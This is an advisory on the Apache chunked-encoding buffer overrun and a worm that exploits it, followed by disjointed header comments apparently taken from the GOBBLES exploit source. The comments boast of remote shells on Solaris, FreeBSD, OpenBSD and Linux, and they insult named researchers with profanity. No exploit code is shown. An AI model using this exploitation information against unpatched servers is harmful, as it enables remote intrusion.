When processing requests coded with the 'Chunked Encoding' mechanism, Apache fails to properly calculate required buffer sizes. This is believed to be due to improper (signed) interpretation of an unsigned integer value. Consequently, several conditions that have security implications may occur. Reportedly, a buffer overrun and signal race condition occur. Exploiting these conditions may allow arbitrary code to run.

**Update**: Reportedly, at least one worm is exploiting this vulnerability to propagate in the wild. The worm targets FreeBSD 4.5 systems running Apache 1.3.22-24 and 1.3.20. Other versions may also be affected.

 * This exploit brought to you by a tagteam effort between GOBBLES Security
 * and ISS X-Forces.  ISS supplied the silly mathematical computations and
 * other abstract figures declaring the exploitation of this bug to be
 * impossible, without factoring in the chance that there might be other
 * conditions present that would allow exploitation.  After the failure of
 * ISS' Santa Claus, GOBBLES Security didn't want to disappoint the kids and
 * the security consultants and have brought forth a brand new shiny toy for
 * all to marvel at.

 * their employees have the biggest dicks.  We're firm believers in the
 * idea that it's not the size of the wave, but rather the motion of the

 *
 * 3APAPAPA said this can't be done on FreeBSD. He probably also thinks
 * qmail can't be exploited remotely. Buzzz! There we go speaking through
 * our asses again.  Anyways we're looking forward to his arguments on why
 * this isn't exploitable on Linux and Solaris.  Lead, follow, or get the
 * fuck out of the way.
 *
 * Weigh the chances of us lying about the Linux version. Hmm, well so far
 * we've used a "same shit, different smell" approach on *BSD, so you could
 * be forgiven for thinking we have no Linux version. Then bring in the
 * reverse psychology factor of this paragraph that also says we don't have
 * one. But we'd say all of the above to make you believe us. This starts to
 * get really complicated.

 * Remote OpenBSD/Apache exploit for the "chunking" vulnerability. Kudos to
 * the OpenBSD developers (Theo, DugSong, jnathan, *@#!w00w00, ...) and
 * their crappy memcpy implementation that makes this 32-bit impossibility
 * very easy to accomplish. This vulnerability was recently rediscovered by a slew
 * of researchers.
 *
 * The "experts" have already concurred that this bug...
 *      -       Can not be exploited on 32-bit *nix variants
 *      -       Is only exploitable on win32 platforms
 *      -       Is only exploitable on certain 64-bit systems
 *
 * However, contrary to what ISS would have you believe, we have
 * successfully exploited this hole on the following operating systems:
 *
 *      Sun Solaris 6-8 (sparc/x86)
 *      FreeBSD 4.3-4.5 (x86)
 *      OpenBSD 2.6-3.1 (x86)
 *      Linux (GNU) 2.4 (x86)
 *
 * Don't get discouraged too quickly in your own research. It took us close
 * to two months to be able to exploit each of the above operating systems.
 * There is a peculiarity to be found for each operating system that makes the
 * exploitation possible.
 *
 * Don't email us asking for technical help or begging for warez. We are
 * busy working on many other wonderful things, including other remotely
 * exploitable holes in Apache. Perhaps The Great Pr0ix would like to inform
 * the community that those holes don't exist? We wonder who's paying her.
 *
 * This code is an early version from when we first began researching the
 * vulnerability. It should spawn a shell on any unpatched OpenBSD system
 * running the Apache webserver.
 *
 * We appreciate The Blue Boar's effort to allow us to post to his mailing
 * list once again. Because he finally allowed us to post, we now have this
 * very humble offering.
 *
 * This is a very serious vulnerability. After disclosing this exploit, we
 * hope to have gained immense fame and glory.
